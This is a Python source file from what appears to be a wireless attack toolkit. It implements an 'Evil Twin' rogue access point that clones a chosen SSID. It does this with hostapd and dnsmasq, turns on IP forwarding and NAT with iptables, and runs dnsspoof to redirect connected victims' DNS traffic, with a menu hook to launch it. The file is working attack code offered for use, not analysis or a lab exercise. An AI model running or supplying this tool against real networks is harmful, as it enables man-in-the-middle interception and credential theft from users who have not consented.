# attacks/evil_twin.py
import os
import subprocess
import threading
import time

temp_dir = '/tmp/airstrike_evil_twin'
HOSTAPD_CONF = os.path.join(temp_dir, 'hostapd.conf')
DNSMASQ_CONF = os.path.join(temp_dir, 'dnsmasq.conf')

class EvilTwin:
    def __init__(self, interface, ssid, channel, web_root='/var/www/html'):
        self.base_interface = interface  # typically 'wlan0'
        self.ssid = ssid
        self.channel = channel
        self.web_root = web_root
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.dnsspoof_proc = None

    def _resolve_interface(self):
        # Determine if airmon-ng renamed the interface
        if os.path.exists(f"/sys/class/net/{self.base_interface}"):
            return self.base_interface
        mon = self.base_interface + 'mon'
        if os.path.exists(f"/sys/class/net/{mon}"):
            return mon
        raise RuntimeError(f"No interface {self.base_interface} or {mon} found")

    def prepare(self):
        os.makedirs(temp_dir, exist_ok=True)
        iface = self._resolve_interface()
        # generate hostapd.conf pointing at resolved interface
        with open(HOSTAPD_CONF, 'w') as f:
            f.write(f"""
interface={iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
""")
        # generate dnsmasq.conf
        with open(DNSMASQ_CONF, 'w') as f:
            f.write(f"""
interface={iface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
""")

    def start(self):
        iface = self._resolve_interface()
        # bring interface up with static IP
        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], check=True)
        subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', iface], check=True)
        # enable IP forwarding & NAT
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
        subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', iface, '-j', 'ACCEPT'], check=True)
        # start processes
        self.hostapd_proc = subprocess.Popen(['sudo', 'hostapd', HOSTAPD_CONF])
        self.dnsmasq_proc = subprocess.Popen(['sudo', 'dnsmasq', '-C', DNSMASQ_CONF, '-d'])
        # small delay to ensure DHCP server is up
        time.sleep(2)
        self.dnsspoof_proc = subprocess.Popen(['sudo', 'dnsspoof', '-i', iface])

    def stop(self):
        # terminate subprocesses
        for proc in (self.dnsspoof_proc, self.dnsmasq_proc, self.hostapd_proc):
            if proc:
                proc.terminate()
        # restore iptables and forwarding
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=False)
        subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', self._resolve_interface(), '-j', 'ACCEPT'], check=False)
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
        # bring interface down
        subprocess.run(['sudo', 'ip', 'link', 'set', self._resolve_interface(), 'down'], check=True)
        # clean up
        if os.path.isdir(temp_dir):
            for f in os.listdir(temp_dir): os.remove(os.path.join(temp_dir, f))
            os.rmdir(temp_dir)

# Integration into main.py
# at top: from attacks.evil_twin import EvilTwin
# in main_menu(): add option "4. Evil Twin Attack"

def evil_twin_menu():
    print("\n" + "="*40)
    print("Evil Twin Attack")
    print("="*40)
    set_monitor_mode(interface)  # from utils.network_utils
    ssid = input("Enter SSID to clone: ").strip()
    channel = input("Enter channel number: ").strip()
    et = EvilTwin(interface, ssid, channel)
    et.prepare()
    print("Starting Evil Twin... Press Ctrl+C to stop.")
    et.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping Evil Twin...")
        et.stop()
        set_managed_mode(interface)  # restore to managed mode
